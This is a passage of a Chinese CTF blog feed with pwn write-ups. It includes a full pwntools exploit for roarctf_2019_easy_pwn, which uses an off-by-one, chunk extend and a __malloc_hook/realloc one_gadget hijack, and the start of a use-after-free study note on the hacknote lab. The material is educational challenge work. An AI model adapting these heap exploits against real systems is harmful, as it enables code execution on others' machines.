class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"><span class="comment"># one = [0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">onegadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># create(0x10,&#x27;skye,yyds&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><h4 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h4><p>一个堆管理器，有增删查改功能。所有功能都是基于列表的下标定位操作对象。用 3 个列表维护堆：chunk_inuse、chunk_size、chunk_ptr。</p><h4 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h4><p>在 edit 功能里面 sub_E26 函数，这个函数用来处理输入长度的，具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check_size</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> input_length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)input_length )</span><br><span class="line">    <span class="keyword">return</span> input_length;</span><br><span class="line">  <span class="keyword">if</span> ( input_length - size == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = size + <span class="number">1</span>;<span class="comment">//off by one</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = size;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们要求写入的长度（input_length）大于堆 size 10 个字节时，就可以写入 size + 1 字节，造成 off by one 。</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>这条题目和 <code>[V&amp;N2020 公开赛]simpleHeap</code> 思路一样。</p><p>使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。</p><p>将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 __malloc_hook 。</p><p>实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./roarctf_2019_easy_pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29259</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./roarctf_2019_easy_pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>)<span class="comment">#overwrite</span></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">create(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#protect</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xe1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload)-<span class="number">1</span>+<span class="number">10</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line"><span class="comment"># one = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">onegadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://bbs.pediy.com/thread-246786.htm">[原创]堆的六种利用手法</a></li><li><a href="https://blog.csdn.net/breeze_cat/article/details/103789081">[pwn]堆：realloc_hook控制栈结构达成onegadget</a></li><li><a href="https://xz.aliyun.com/t/6559">pwn学习系列之Extend the chunk及realloc_hook利用</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> realloc_hook </tag>
            
            <tag> onegadget </tag>
            
            <tag> malloc_hook </tag>
            
            <tag> 合天 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF学习笔记</title>
      <link href="archives/dce2ba26/"/>
      <url>archives/dce2ba26/</url>
      
        <content type="html"><![CDATA[<blockquote><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><blockquote><p>dangling pointer ： 悬空指针</p><p>wild pointer ：野指针，没有被初始化过的指针</p></blockquote><p>这里给出一个简单的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  use_after_free git:(use_after_free) ✗ .&#x2F;use_after_free                      </span><br><span class="line">this is my function</span><br><span class="line">I can also use it</span><br><span class="line">call print my name</span><br><span class="line">this pogram will crash...</span><br><span class="line">[1]    38738 segmentation fault (core dumped)  .&#x2F;use_after_free</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里我们以 HITCON-training 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">lab 10 hacknote</a> 为例。</p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><p>我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br></pre></td></tr></table></figure><p>故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。</p><h4 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h4><p>根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  note *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        notelist[i]-&gt;put = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0-&gt;content = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i]-&gt;content )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, notelist[i]-&gt;content, size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h4><p>print_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h4><p>delete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？<strong>一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</strong> 那么该怎么执行呢？</p><p>我们可以简单来看一下每一个 note 生成的具体流程</p><ol><li><p>程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。</p></li><li><p>程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------------+                       </span><br><span class="line">|   put           |                       </span><br><span class="line">+-----------------+                       </span><br><span class="line">|   content       |       size              </span><br><span class="line">+-----------------+-------------------&gt;+----------------+</span><br><span class="line">                                       |     real       |</span><br><span class="line">                                       |    content     |</span><br><span class="line">                                       |                |</span><br><span class="line">                                       +----------------+</span><br></pre></td></tr></table></figure></li></ol><p>那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p><ul><li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>释放 note0</li><li>释放 note1</li><li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li><li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li><li>note2 其实会分配 note1 对应的内存块。</li><li>real content 对应的 chunk 其实是 note0。</li><li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li></ul><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 